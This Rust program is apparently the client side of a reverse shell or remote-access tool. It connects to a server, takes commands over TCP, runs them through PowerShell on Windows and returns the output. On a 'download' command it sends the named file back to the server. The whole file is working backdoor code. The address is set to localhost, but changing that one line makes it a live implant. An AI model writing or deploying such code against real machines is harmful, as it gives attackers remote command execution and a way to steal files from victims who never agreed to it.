use std::fs::File;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::Command;
use std::sync::{Arc, Mutex};
//use std::thread;

fn send_file(path: &str, stream: &mut TcpStream) -> io::Result<()> {
    let mut file = File::open(path)?;
    let mut buffer = [0; 1024];

    // Send the file name first
    let file_name = std::path::Path::new(path)
        .file_name()
        .unwrap()
        .to_str()
        .unwrap();
    stream.write_all(file_name.as_bytes())?;
    stream.write_all(b"\n")?;

    loop {
        let bytes_read = file.read(&mut buffer)?;
        if bytes_read == 0 {
            break;
        }
        stream.write_all(&buffer[..bytes_read])?;
    }

    Ok(())
}

fn execute_server_response(server_response: &str, stream: &mut TcpStream) -> io::Result<()> {
    if server_response.starts_with("download ") {
        let path = &server_response[9..].trim();
        send_file(path, stream)
    } else {
        if cfg!(target_os = "windows") {
            let output = Command::new("powershell")
                .arg("-Command")
                .arg(server_response.to_string())
                .output()
                .expect("Failed to execute PowerShell command");

            if let Ok(output_str) = String::from_utf8(output.stdout) {
                stream.write_all(output_str.as_bytes()).expect("Failed to write to server");
            } else {
                let error_message = "Failed to parse PowerShell output.";
                stream.write_all(error_message.as_bytes()).expect("Failed to write to server");
            }
        }
        Ok(())
    }
}

fn main() {
    let mut stream = TcpStream::connect("127.0.0.1:8080").expect("Failed to connect to server!");
    let server_msg = Arc::new(Mutex::new(String::new()));
    let server_msg_clone = Arc::clone(&server_msg);
    loop {
        let mut buffer = [0; 1024];
        let bytes_read = stream.read(&mut buffer).expect("Failed to read from server");
        if bytes_read == 0 {
            break;
        }
        let server_response = String::from_utf8_lossy(&buffer[..bytes_read]);

        let mut msg = server_msg_clone.lock().unwrap();
        *msg = server_response.to_string();
        execute_server_response(&server_response, &mut stream).expect("Failed to execute server response");
    }
}
